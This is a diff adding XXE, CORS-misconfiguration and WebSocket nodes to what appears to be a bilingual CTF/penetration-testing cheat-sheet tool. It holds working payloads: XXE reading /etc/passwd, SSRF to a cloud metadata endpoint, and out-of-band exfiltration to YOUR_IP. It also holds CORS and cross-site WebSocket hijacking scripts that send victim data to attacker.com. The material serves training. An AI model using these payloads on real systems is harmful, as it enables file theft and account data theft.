@@ -1177,4 +1177,147 @@ NODES["smb_enum"].choices.push(
   { label: "Partage en écriture → SCF/techniques avancées", label_en: "Writable share → SCF/advanced techniques", next: "smb_deep", icon: "⚔️" }
 );
 
-console.log("[CTF Bible] Extension chargée :", Object.keys(NODES).length, "nœuds au total");
+// ── New nodes (v2 update) ─────────────────────────────────────────────────────
+
+Object.assign(NODES, {
+
+  "web_xxe": {
+    id: "web_xxe", title: "XXE — XML External Entity", title_en: "XXE — XML External Entity", category: "web", icon: "📄",
+    description: "L'application analyse du XML contrôlé par l'attaquant et les entités XML externes ne sont pas désactivées → lecture de fichiers locaux, SSRF, ou RCE.",
+    description_en: "The application parses attacker-controlled XML and external XML entities are not disabled → local file read, SSRF, or RCE.",
+    commands: [
+      { label: "Payload XXE — lecture de fichier", label_en: "XXE payload — file read", cmd: '<?xml version="1.0"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n<root>&xxe;</root>' },
+      { label: "XXE — lecture /etc/shadow via wrapper PHP", label_en: "XXE — read /etc/shadow via PHP wrapper", cmd: '<?xml version="1.0"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">\n]>\n<root>&xxe;</root>' },
+      { label: "XXE — SSRF vers service interne", label_en: "XXE — SSRF to internal service", cmd: '<?xml version="1.0"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">\n]>\n<root>&xxe;</root>' },
+      { label: "XXE — Blind via out-of-band (OOB)", label_en: "XXE — Blind via out-of-band (OOB)", cmd: '# Héberger un DTD malveillant sur ton serveur :\n# evil.dtd :\n<!ENTITY % file SYSTEM "file:///etc/passwd">\n<!ENTITY % oob "<!ENTITY exfil SYSTEM \'http://YOUR_IP/?data=%file;\' >">\n%oob;\n\n# Payload XXE :\n<?xml version="1.0"?>\n<!DOCTYPE foo SYSTEM "http://YOUR_IP/evil.dtd">\n<root>&exfil;</root>' },
+      { label: "Détecter XXE dans Content-Type", label_en: "Detect XXE in Content-Type", cmd: "# Changer Content-Type: application/json → application/xml\n# ou Content-Type: text/xml\n# et envoyer un payload XML minimaliste" }
+    ],
+    lookfor: [
+      "L'app accepte du XML (API, upload de fichier, SOAP, PDF/DOCX parseur)",
+      "Content-Type: application/xml ou text/xml",
+      "Réponse d'erreur qui reflète le contenu XML",
+      "Endpoints /api/upload, /import, /convert"
+    ],
+    lookfor_en: [
+      "App accepts XML (API, file upload, SOAP, PDF/DOCX parser)",
+      "Content-Type: application/xml or text/xml",
+      "Error response that reflects XML content",
+      "Endpoints /api/upload, /import, /convert"
+    ],
+    tips: [
+      "Burp Suite → intercepter et modifier Content-Type pour injecter du XML",
+      "XXE Blind → utiliser Burp Collaborator ou interactsh pour détecter les callbacks OOB",
+      "Certains parseurs bloquent les entités externes mais pas les parameter entities",
+      "DOCX/XLSX/ODT sont des ZIPs contenant du XML → potentiellement vulnérables"
+    ],
+    tips_en: [
+      "Burp Suite → intercept and modify Content-Type to inject XML",
+      "Blind XXE → use Burp Collaborator or interactsh to detect OOB callbacks",
+      "Some parsers block external entities but not parameter entities",
+      "DOCX/XLSX/ODT are ZIPs containing XML → potentially vulnerable"
+    ],
+    choices: [
+      { label: "Lecture de fichiers locaux obtenue", label_en: "Local file read obtained", next: "web_lfi_found", icon: "📂" },
+      { label: "SSRF vers service interne confirmé", label_en: "SSRF to internal service confirmed", next: "rce_found", icon: "💥" }
+    ]
+  },
+
+  "web_cors": {
+    id: "web_cors", title: "CORS Misconfiguration", title_en: "CORS Misconfiguration", category: "web", icon: "🌐",
+    description: "Le serveur reflète n'importe quelle origine ou fait confiance à null/sous-domaines non contrôlés → vol de données authentifiées cross-origin.",
+    description_en: "The server reflects any origin or trusts null/uncontrolled subdomains → theft of authenticated cross-origin data.",
+    commands: [
+      { label: "Tester la réflexion d'origine", label_en: "Test origin reflection", cmd: "curl -s -H 'Origin: https://evil.com' -I http://TARGET_IP/api/user\n# Chercher: Access-Control-Allow-Origin: https://evil.com\n# et: Access-Control-Allow-Credentials: true" },
+      { label: "Tester null origin", label_en: "Test null origin", cmd: "curl -s -H 'Origin: null' -I http://TARGET_IP/api/user\n# Si: Access-Control-Allow-Origin: null → vulnérable via sandboxed iframe" },
+      { label: "Payload exploitant le CORS (page HTML de l'attaquant)", label_en: "CORS exploit payload (attacker's HTML page)", cmd: '<script>\nfetch("https://TARGET_IP/api/profile", {credentials: "include"})\n  .then(r => r.text())\n  .then(d => fetch("https://attacker.com/steal?data=" + btoa(d)));\n</script>' },
+      { label: "Test avec sous-domaine arbitraire", label_en: "Test with arbitrary subdomain", cmd: "curl -s -H 'Origin: https://evil.TARGET_IP' -I http://TARGET_IP/api/\n# Si Accept-Origin: evil.TARGET_IP → vulnérable via XSS sous-domaine" }
+    ],
+    lookfor: [
+      "Access-Control-Allow-Origin reflète l'origine envoyée",
+      "Access-Control-Allow-Credentials: true combiné avec ACAO dynamique",
+      "ACAO: null (exploitable via iframe sandboxée)",
+      "Wildcard *.domain.com avec sous-domaine contrôlable"
+    ],
+    lookfor_en: [
+      "Access-Control-Allow-Origin reflects the sent origin",
+      "Access-Control-Allow-Credentials: true combined with dynamic ACAO",
+      "ACAO: null (exploitable via sandboxed iframe)",
+      "Wildcard *.domain.com with controllable subdomain"
+    ],
+    tips: [
+      "CORS n'est exploitable que si l'utilisateur est authentifié (session cookie)",
+      "Seul dangereux si ACAO est dynamique ET Allow-Credentials: true",
+      "Wildcard * seul n'est pas exploitable avec credentials",
+      "Chercher dans Burp les réponses avec Access-Control-Allow-Origin"
+    ],
+    tips_en: [
+      "CORS is only exploitable if the user is authenticated (session cookie)",
+      "Only dangerous if ACAO is dynamic AND Allow-Credentials: true",
+      "Wildcard * alone is not exploitable with credentials",
+      "Search in Burp for responses with Access-Control-Allow-Origin"
+    ],
+    choices: [
+      { label: "CORS exploitable → vol de données authentifiées", label_en: "Exploitable CORS → authenticated data theft", next: "web_authenticated", icon: "🔑" }
+    ]
+  },
+
+  "web_websocket": {
+    id: "web_websocket", title: "WebSocket Security Testing", title_en: "WebSocket Security Testing", category: "web", icon: "🔌",
+    description: "Les WebSockets contournent souvent les protections CSRF et peuvent être vulnérables à des injections, CSWSH, ou des problèmes de contrôle d'accès.",
+    description_en: "WebSockets often bypass CSRF protections and can be vulnerable to injections, CSWSH, or access control issues.",
+    commands: [
+      { label: "Identifier les WebSockets avec Burp", label_en: "Identify WebSockets with Burp", cmd: "# Dans Burp → onglet WebSockets History\n# Chercher les messages WS dans la tab Proxy" },
+      { label: "Test injection via messages WS", label_en: "Test injection via WS messages", cmd: "# Intercepter un message WebSocket dans Burp\n# Modifier le contenu : tester SQLi, XSS, SSTI\n# Exemple payload : {\"user\": \"admin' OR 1=1--\"}" },
+      { label: "CSWSH — Cross-Site WebSocket Hijacking", label_en: "CSWSH — Cross-Site WebSocket Hijacking", cmd: '<script>\nvar ws = new WebSocket("wss://TARGET_IP/chat");\nws.onmessage = function(e) {\n  fetch("https://attacker.com/steal?d=" + btoa(e.data));\n};\nws.onopen = function() { ws.send(\'{"action":"get_profile"}\'); };\n</script>' },
+      { label: "wscat — client WebSocket CLI", label_en: "wscat — WebSocket CLI client", cmd: "wscat -c ws://TARGET_IP/ws\nwscat -c wss://TARGET_IP/ws --no-check\n# Interagir avec le serveur WS depuis le terminal" }
+    ],
+    lookfor: [
+      "Upgrade: websocket dans les headers HTTP",
+      "Messages WS sans token CSRF ou vérification d'origine",
+      "Données sensibles transmises via WS sans authentification",
+      "Contrôle d'accès horizontal : accéder aux données d'un autre user"
+    ],
+    lookfor_en: [
+      "Upgrade: websocket in HTTP headers",
+      "WS messages without CSRF token or origin check",
+      "Sensitive data transmitted via WS without authentication",
+      "Horizontal access control: access another user's data"
+    ],
+    tips: [
+      "Burp Pro supporte l'interception et modification des messages WebSocket",
+      "CSWSH nécessite que le serveur ne vérifie pas l'origine",
+      "Tester si le handshake WebSocket utilise des cookies → CSWSH possible",
+      "Portswigger WebSocket labs : excellent pour s'entraîner"
+    ],
+    tips_en: [
+      "Burp Pro supports interception and modification of WebSocket messages",
+      "CSWSH requires the server not to check the origin",
+      "Test if the WebSocket handshake uses cookies → CSWSH possible",
+      "Portswigger WebSocket labs: excellent for practice"
+    ],
+    choices: [
+      { label: "Injection confirmée (SQLi/XSS/SSTI via WS)", label_en: "Injection confirmed (SQLi/XSS/SSTI via WS)", next: "web_param_vuln", icon: "💉" },
+      { label: "CSWSH exploitable → vol de données", label_en: "CSWSH exploitable → data theft", next: "web_authenticated", icon: "🔑" }
+    ]
+  }
+
+});
+
+// Patch web_param_vuln to add XXE, CORS, WebSocket choices
+if (NODES["web_param_vuln"]) {
+  NODES["web_param_vuln"].choices.push(
+    { label: "XXE confirmé — entités XML externes", label_en: "XXE confirmed — external XML entities", next: "web_xxe", icon: "📄" },
+    { label: "CORS mal configuré (origine reflétée)", label_en: "CORS misconfigured (origin reflected)", next: "web_cors", icon: "🌐" },
+    { label: "WebSocket détecté", label_en: "WebSocket detected", next: "web_websocket", icon: "🔌" }
+  );
+}
+
+// Patch web_api to add WebSocket and CORS choices
+if (NODES["web_api"]) {
+  NODES["web_api"].choices.push(
+    { label: "WebSocket dans l'application", label_en: "WebSocket in the application", next: "web_websocket", icon: "🔌" },
+    { label: "CORS mal configuré sur l'API", label_en: "CORS misconfigured on the API", next: "web_cors", icon: "🌐" }
+  );
+}
+
+console.log("[NullRoute] Extension chargée :", Object.keys(NODES).length, "nœuds au total");
